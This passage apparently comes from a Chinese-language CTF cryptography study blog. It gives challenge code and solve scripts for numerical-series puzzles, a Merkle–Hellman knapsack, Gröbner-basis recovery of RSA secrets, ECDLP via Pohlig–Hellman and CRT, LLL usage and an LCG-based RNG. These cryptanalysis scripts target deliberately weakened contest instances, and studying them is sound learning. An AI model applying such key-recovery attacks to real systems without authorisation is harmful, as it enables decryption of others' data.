class="number">1</span> / <span class="number">2</span> - i + <span class="number">1</span>)) / i</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Point</span>(<span class="params">self, center</span>):</span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        center -= <span class="number">1</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; self.num:</span><br><span class="line">            <span class="built_in">sum</span> += (center ** (<span class="number">1</span> / <span class="number">2</span> - i) * self.Coe(i))</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">All</span>(<span class="params">bound</span>):</span><br><span class="line">    num = randint(<span class="number">1111</span>, <span class="number">2222</span>)</span><br><span class="line">    T = MySeries(num)</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    i = <span class="number">3</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; bound:</span><br><span class="line">        b1 = T.Point(i)</span><br><span class="line">        b2 = T.Point(i + <span class="number">1</span>)</span><br><span class="line">        output += (b1 + b2) / <span class="number">2</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line">k = <span class="built_in">int</span>(All(n))</span><br></pre></td></tr></table></figure>
<p>给定函数其实是在通过梯形法则计算</p>
<script type="math/tex; mode=display">\int_3^{bound}\sqrt x\mathrm dx</script><p>那么解密脚本(sage,只求高位)大致如下:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">F = RealField(<span class="number">20000</span>)				<span class="comment"># 定义实数域是20000位2进制</span></span><br><span class="line">n=F(<span class="string">&#x27;1145141919810&#x27;</span>)				<span class="comment"># 域上的数字</span></span><br><span class="line">kk=<span class="built_in">int</span>(<span class="number">2</span>*n**(<span class="number">3</span>/<span class="number">2</span>)/<span class="number">3</span>-<span class="number">2</span>*<span class="number">3</span>**(<span class="number">1</span>/<span class="number">2</span>))		<span class="comment"># 直接算积分答案</span></span><br><span class="line">kk									<span class="comment"># 输出</span></span><br></pre></td></tr></table></figure></p>
<h3 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">getcontext().prec = <span class="number">1145</span></span><br><span class="line">a = Decimal(N2-<span class="number">10</span>**<span class="number">615</span>)/(N2+<span class="number">10</span>**<span class="number">615</span>)</span><br><span class="line">b = Decimal(N2**<span class="number">2</span>-<span class="number">2</span>*<span class="number">10</span>**<span class="number">615</span>*N2+<span class="number">10</span>**<span class="number">1230</span>)/(N2**<span class="number">2</span>+<span class="number">2</span>*<span class="number">10</span>**<span class="number">615</span>*N2+<span class="number">10</span>**<span class="number">1230</span>)</span><br><span class="line">c = <span class="number">0</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> funky <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18905</span>):</span><br><span class="line">    c += a/i</span><br><span class="line">    i += <span class="number">2</span></span><br><span class="line">    a *= b</span><br><span class="line">c *= <span class="number">2</span></span><br><span class="line">Q2 = c</span><br></pre></td></tr></table></figure>
<p>给定函数在求这个东西:</p>
<script type="math/tex; mode=display">x=\frac{N-10^{615}}{N+10^{615}},Q=\frac x1+\frac {x^3}{3}+\frac {x^5}5+...</script><p>问AI告诉我说后面在拟合这个函数:</p>
<script type="math/tex; mode=display">\ln\left(\frac{1+x}{1-x}\right)</script><p>回带得到了这个脚本(sage):<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">F = RealField(<span class="number">13300</span>)</span><br><span class="line">Q2 = F(<span class="string">&#x27;2.1145141919810&#x27;</span>)</span><br><span class="line">c2 = <span class="number">1145141919810</span></span><br><span class="line">N2 = <span class="built_in">round</span>(exp(Q2) * <span class="number">10</span>**<span class="number">615</span>)</span><br></pre></td></tr></table></figure></p>
<h3 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getcontext().prec = <span class="number">4000</span></span><br><span class="line">a = Decimal(N3)</span><br><span class="line">b = Decimal(<span class="number">1</span>)/<span class="number">40000</span></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> baka <span class="keyword">in</span> <span class="number">40000</span>:</span><br><span class="line">    c += Decimal(<span class="number">10</span>**<span class="number">1860</span>)/(a**<span class="number">3</span> + <span class="number">1</span>)</span><br><span class="line">    a += b</span><br><span class="line">c *= Decimal(<span class="number">1</span>)/<span class="number">40000</span></span><br><span class="line">Q3 = c</span><br></pre></td></tr></table></figure>
<p>问AI得到是在拟合这个东西:</p>
<script type="math/tex; mode=display">\int_{N3}^{N3+1}\frac{10^{1860}}{x^3+1}\mathrm dx</script><p>这就不能用一般的定积分计算了,问AI求积分得到了一个非常复杂的式子,考虑有没有其他解法:</p>
<p>观察到在N3特别大的时候,1/(x^3+1)曲线非常非常平缓,所以近似成一条直线,且可以近似成一条平行x轴的直线,据此我们可以写出:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">F = RealField(<span class="number">13300</span>)</span><br><span class="line">Q3 = F(<span class="string">&#x27;53386726097.1145141919810&#x27;</span>)</span><br><span class="line">c3 = <span class="number">1145141919810</span></span><br><span class="line">N3 = <span class="built_in">round</span>((<span class="number">10</span>**<span class="number">1860</span>/Q3-<span class="number">1</span>)**(<span class="number">1</span>/<span class="number">3</span>))</span><br></pre></td></tr></table></figure></p>
<h2 id="Knapsnack"><a href="#Knapsnack" class="headerlink" title="Knapsnack"></a>Knapsnack</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加密脚本</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt; <span class="number">48</span></span><br><span class="line">n = <span class="number">48</span>*<span class="number">8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>():</span><br><span class="line">    w = []</span><br><span class="line">    w.append(getRandomNBitInteger(<span class="number">64</span>))</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>):</span><br><span class="line">        w.append(<span class="number">2</span>*w[-<span class="number">1</span>] + random.getrandbits(w[-<span class="number">1</span>].bit_length()))</span><br><span class="line">    q = <span class="number">2</span>*w[-<span class="number">1</span>] + random.getrandbits(w[-<span class="number">1</span>].bit_length())</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = random.randrange(q)</span><br><span class="line">        <span class="keyword">if</span> GCD(r, q) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    b = [ww*r % q <span class="keyword">for</span> ww <span class="keyword">in</span> w]</span><br><span class="line">    pkey = b</span><br><span class="line">    skey = (w, q, r)</span><br><span class="line">    <span class="keyword">return</span> pkey, skey</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text: <span class="built_in">bytes</span>, pkey</span>):</span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> bit, bb <span class="keyword">in</span> <span class="built_in">zip</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;<span class="subst">&#123;b:08b&#125;</span>&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> text).zfill(n)), pkey):</span><br><span class="line">        c += bit * bb</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">pkey, skey = keygen()</span><br><span class="line">c = encrypt(flag, pkey)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密脚本</span></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mh_decrypt</span>(<span class="params">c: <span class="built_in">int</span>, skey: <span class="type">Tuple</span>[<span class="type">List</span>[<span class="built_in">int</span>], <span class="built_in">int</span>, <span class="built_in">int</span>], n_bits: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Decrypt Merkle–Hellman knapsack ciphertext given secret key (w, q, r).</span></span><br><span class="line"><span class="string">    - c: message</span></span><br><span class="line"><span class="string">    - skey: (w, q, r) where w is the superincreasing sequence (list), q modulus, r multiplier</span></span><br><span class="line"><span class="string">    - n_bits: length of the array (e.g. 48*8 for the challenge)</span></span><br><span class="line"><span class="string">    Returns decrypted bytes (with left-zero bytes stripped).</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    w, q, r = skey</span><br><span class="line">    <span class="comment"># modular inverse of r mod q</span></span><br><span class="line">    r_inv = <span class="built_in">pow</span>(r, -<span class="number">1</span>, q)</span><br><span class="line">    <span class="comment"># multiply ciphertext by inverse to remove multiplier (mod q)</span></span><br><span class="line">    c_prime = (c * r_inv) % q</span><br><span class="line">    <span class="comment"># now c_prime should equal sum(b_i * w_i) where b_i in &#123;0,1&#125;</span></span><br><span class="line">    bits = [<span class="number">0</span>] * <span class="built_in">len</span>(w)</span><br><span class="line">    <span class="comment"># Greedy recover since w is superincreasing: go from largest to smallest</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(w)-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> c_prime &gt;= w[i]:</span><br><span class="line">            bits[i] = <span class="number">1</span></span><br><span class="line">            c_prime -= w[i]</span><br><span class="line">    <span class="comment"># bits is a list of 0/1, MSB at index 0 if encryption used left-to-right order.</span></span><br><span class="line">    bitstring = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bits)</span><br><span class="line">    <span class="comment"># Ensure bitstring length is n_bits (zfill was used in encryption)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(bitstring) &lt; n_bits:</span><br><span class="line">        bitstring = bitstring.zfill(n_bits)</span><br><span class="line">    <span class="comment"># Convert bitstring (big-endian) to integer and then to bytes</span></span><br><span class="line">    value = <span class="built_in">int</span>(bitstring, <span class="number">2</span>)</span><br><span class="line">    out_bytes = value.to_bytes(n_bits // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="comment"># Original plaintext was right-aligned into n_bits via zfill, so strip leading null bytes</span></span><br><span class="line">    <span class="keyword">return</span> out_bytes.lstrip(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">flag=mh_decrypt(c,skey,<span class="number">48</span>*<span class="number">8</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h2 id="Grobner基"><a href="#Grobner基" class="headerlink" title="Gröbner基"></a>Gröbner基</h2><p>一个解方程的神秘算法,实际上只会写脚本就行了…</p>
<h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">103</span></span><br><span class="line">x = getrandbits(<span class="number">4096</span>)</span><br><span class="line">a = (phi**<span class="number">3</span> + x*d**<span class="number">2</span> + (x**<span class="number">2</span> + x*phi + <span class="number">3</span>*d)**<span class="number">2</span>) % n</span><br><span class="line">b = (x**<span class="number">2</span> - <span class="number">3</span>*x + x*d**<span class="number">3</span>*phi + d**<span class="number">2</span> - <span class="number">13</span>*phi**<span class="number">2</span>) % n</span><br><span class="line">c = (phi**<span class="number">2</span> + <span class="number">7</span>*phi - x**<span class="number">2</span>*d + x - d**<span class="number">2</span>) % n</span><br></pre></td></tr></table></figure>
<p>首先,直接按照这个神秘算法是解不出来的…太复杂了…<br>问了管理员(这是”魔法少女网站”吗?一道题必须问管理员才做得出来)才发现,原来是少了一个隐藏条件(ed=1 mod phi这个).<br>然后管理员说,e很小,所以考虑直接爆破k得到第四个条件,然后写解密脚本.<br>最后将x取模意义下的反值,带入原方程构造:(这个是最终的脚本,大差不差的)<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">n=</span><br><span class="line">e=</span><br><span class="line">a_val=</span><br><span class="line">b_val=</span><br><span class="line">c_val=</span><br><span class="line">k=</span><br><span class="line">x=</span><br><span class="line">R.&lt;phi,d&gt;=PolynomialRing(Zmod(n),<span class="number">2</span>)<span class="comment"># 几个未知数</span></span><br><span class="line">f1=phi**<span class="number">3</span>+x*d**<span class="number">2</span>+(x**<span class="number">2</span>+x*phi+<span class="number">3</span>*d)**<span class="number">2</span>-a</span><br><span class="line">f2=x**<span class="number">2</span>-<span class="number">3</span>*x+x*d**<span class="number">3</span>*phi+d**<span class="number">2</span>-<span class="number">13</span>*phi**<span class="number">2</span>-b</span><br><span class="line">f3=phi**<span class="number">2</span>+<span class="number">7</span>*phi-x**<span class="number">2</span>*d+x-d**<span class="number">2</span>-c</span><br><span class="line">f4=e*d-k*phi-<span class="number">1</span></span><br><span class="line">I=R.ideal(f1,f2,f3,f4)</span><br><span class="line">groebner_basis=I.groebner_basis()</span><br><span class="line"><span class="keyword">for</span> g <span class="keyword">in</span> groebner_basis:</span><br><span class="line">	<span class="comment"># print(g)</span></span><br><span class="line">	<span class="keyword">if</span> g.variables() == (d,): <span class="comment"># 如果多项式只包含d</span></span><br><span class="line">		<span class="built_in">print</span>(g)</span><br><span class="line">	<span class="keyword">if</span> g.variables() == (phi,): <span class="comment"># 如果多项式只包含phi</span></span><br><span class="line">		<span class="built_in">print</span>(g)</span><br></pre></td></tr></table></figure><br>然后得到d和phi,随便挑一个就能解.</p>
<h2 id="ECC-椭圆曲线加密"><a href="#ECC-椭圆曲线加密" class="headerlink" title="ECC 椭圆曲线加密"></a>ECC 椭圆曲线加密</h2><p>公开: P,Q两点 a,b椭圆曲线参数<br>保留: k(Q=kP的k)</p>
<p>加密:随机数字r,求出(rP,msg+rQ)<br>解密:使用私钥k,求出krP=rQ,做差得到msg.</p>
<p><strong>注意</strong> :假如知道Q=k*P,已知Q和k是反推不出来P的,因为不知道逆元(这里是没有点减法的)…<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)					<span class="comment"># 随机模数</span></span><br><span class="line">F = GF(p)							<span class="comment"># 限定域</span></span><br><span class="line">E = EllipticCurve(F, [<span class="number">114</span>, <span class="number">514</span>])	<span class="comment"># 参数a,b,这是最简单的形式E: y^2 = x^3 + ax + b</span></span><br><span class="line"></span><br><span class="line">P = E.random_point()				<span class="comment"># 随机初始点P</span></span><br><span class="line">Q1 = P*<span class="number">1145141919810893</span>				<span class="comment"># 第一个公钥点</span></span><br><span class="line">Q2 = P*<span class="number">1337133713371337</span>				<span class="comment"># 第二个公钥点</span></span><br><span class="line"></span><br><span class="line">P.x()		<span class="comment"># P点的x坐标</span></span><br><span class="line">P.xy()		<span class="comment"># P点的x坐标</span></span><br><span class="line">P.order()	<span class="comment"># P点的阶</span></span><br><span class="line"></span><br><span class="line">PP=k*Q		<span class="comment"># sage会自动进行圆锥曲线的运算</span></span><br></pre></td></tr></table></figure></p>
<h3 id="知道两个Q和对应的k求P"><a href="#知道两个Q和对应的k求P" class="headerlink" title="知道两个Q和对应的k求P"></a>知道两个Q和对应的k求P</h3><p>前提:两个k互质.<br>尝试理解点之间变换的精髓: $P=xQ_1+yQ_2=xk_1Q_1+yk_2Q_2$<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g,u,v=xgcd(k1,k2)   <span class="comment"># Sage 内置扩展欧几里得函数</span></span><br><span class="line">P=u*Q1+v*Q2</span><br></pre></td></tr></table></figure></p>
<h3 id="未知P-a-b-mod-已知2P-3P-…-7P"><a href="#未知P-a-b-mod-已知2P-3P-…-7P" class="headerlink" title="未知P,a,b,mod,已知2P,3P,…,7P"></a>未知P,a,b,mod,已知2P,3P,…,7P</h3><p>ab显然解方程就行了.关键在于p怎么算:<br>把多组数据带进去,做差能得到关于mod的倍数.<br>对很多个这样的倍数求gcd即可求出mod.至此原ECC全部还原,直接求PQ还原答案即可.</p>
<h3 id="ECDLP-椭圆曲线离散对数"><a href="#ECDLP-椭圆曲线离散对数" class="headerlink" title="ECDLP 椭圆曲线离散对数"></a>ECDLP 椭圆曲线离散对数</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">k = getRandomNBitInteger(<span class="number">136</span>)</span><br><span class="line">p = <span class="number">85468147895711151675202050796503571876819967288648016286940998128295841240719</span></span><br><span class="line">F = GF(p)</span><br><span class="line">E = EllipticCurve(GF(p), [<span class="number">1</span>, <span class="number">2</span>])</span><br><span class="line">P = E.gens()[<span class="number">0</span>]</span><br><span class="line">Q = k*P</span><br><span class="line">ct = AES.new(hashlib.sha256(<span class="built_in">str</span>(k).encode()).digest(), AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;P = <span class="subst">&#123;P.xy()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Q = <span class="subst">&#123;Q.xy()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ct = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>就是说,给你一个比较特殊的P和Q,尝试爆破出k出来(注意到k比较小…)</p>
<p>脚本抄的别人的,大意是说,对P的阶质因数分解,得到 $k\equiv y\mod P_{sub}$ 的值,然后用CRT合并起来,最后根据模意义爆破出k.<br>和long text不一样的是,这个题是爆破P这个点的阶,再多做几个题之后考虑一下究竟是什么关系.<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">85468147895711151675202050796503571876819967288648016286940998128295841240719</span></span><br><span class="line">F = GF(p)</span><br><span class="line">E = EllipticCurve(GF(p), [<span class="number">1</span>, <span class="number">2</span>])</span><br><span class="line">P = E(xxx,xxx)</span><br><span class="line">Q = E(xxx,xxx)</span><br><span class="line">primes=[<span class="number">2</span>**<span class="number">7</span>,<span class="number">5</span>**<span class="number">2</span>,<span class="number">7</span>,<span class="number">17</span>,<span class="number">241</span>,<span class="number">17729</span>,<span class="number">1011091</span>,<span class="number">1519709</span>,<span class="number">5004119</span>,<span class="number">8022225689</span>]</span><br><span class="line"><span class="comment"># 这里的primes是P的阶的质因数的次方</span></span><br><span class="line">dlogs=[]</span><br><span class="line"><span class="comment"># 这里存离散对数</span></span><br><span class="line"><span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">	t=<span class="built_in">int</span>(P.order()/<span class="built_in">int</span>(fac))</span><br><span class="line">	dlog=discrete_log(t*Q,t*P,operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">	dlogs.append(dlog)</span><br><span class="line">	<span class="built_in">print</span>(fac,dlog)</span><br><span class="line"><span class="built_in">print</span>(crt(dlogs,primes))</span><br></pre></td></tr></table></figure></p>
<p>上面得到的是 $k\equiv y\mod \prod \mathtt{primes}$ .</p>
<h2 id="格密码-Lattice"><a href="#格密码-Lattice" class="headerlink" title="格密码 Lattice"></a>格密码 Lattice</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v=[[],[],...,[]]<span class="comment"># 一个矩阵</span></span><br><span class="line">M=matrix(ZZ,v).LLL()<span class="comment"># 找最近&quot;最小&quot;向量</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(M))	<span class="comment"># 有的时候M太大了打印不出来,就用str(M)打印即可</span></span><br></pre></td></tr></table></figure>
<h3 id="关于LLL"><a href="#关于LLL" class="headerlink" title="关于LLL"></a>关于LLL</h3><p>能对”细长”的矩阵进行操作,返回你希望的”最小”向量(假如说是n行m列的,那么n&lt;=m).<br>据说SageMath内部的small_roots因为使用了Sage自己的LLL(fpill).如果用<a target="_blank" rel="noopener" href="https://github.com/keeganryan/flatter">flatter</a>的话格基约化的速度会更快一些.</p>
<h3 id="Java-Random-Revenge"><a href="#Java-Random-Revenge" class="headerlink" title="Java Random Revenge"></a>Java Random Revenge</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RNG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.seed = seed &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">256</span>) - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self, nbits</span>):</span><br><span class="line">        <span class="keyword">assert</span> nbits <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">257</span>)</span><br><span class="line">        self.seed = (self.seed * <span class="number">0x3f90a5d5b5c731f3d8bd5d672c171588c485c3e5cc040df93a5cf180092fd5c3</span> + <span class="number">0x6976cb41868014055590b677a676f52ff4efae37aac714c0ffabe16688924e8b</span>) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">256</span>) - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; (<span class="number">256</span> - nbits)</span><br><span class="line">rng = RNG(random.SystemRandom().getrandbits(<span class="number">256</span>))</span><br><span class="line">ns = [<span class="number">114</span>, <span class="number">51</span>, <span class="number">41</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">41</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">163</span>, <span class="number">108</span>, <span class="number">145</span>, <span class="number">163</span>, <span class="number">108</span>, <span class="number">145</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">41</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">163</span>, <span class="number">108</span>, <span class="number">145</span>, <span class="number">163</span>, <span class="number">108</span>, <span class="number">145</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">41</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">41</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">163</span>, <span class="number">108</span>, <span class="number">145</span>, <span class="number">163</span>, <span class="number">108</span>, <span class="number">145</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">41</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">163</span>, <span class="number">108</span>, <span class="number">145</span>, <span class="number">163</span>, <span class="number">108</span>, <span class="number">145</span>]</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> ns:</span><br><span class="line">    data.append(rng.<span class="built_in">next</span>(n))</span><br><span class="line"></span><br><span class="line">secret = [rng.<span class="built_in">next</span>(<span class="number">256</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">ct = AES.new(hashlib.sha256(<span class="built_in">str</span>(secret).encode()).digest(), AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ns = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;data = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span 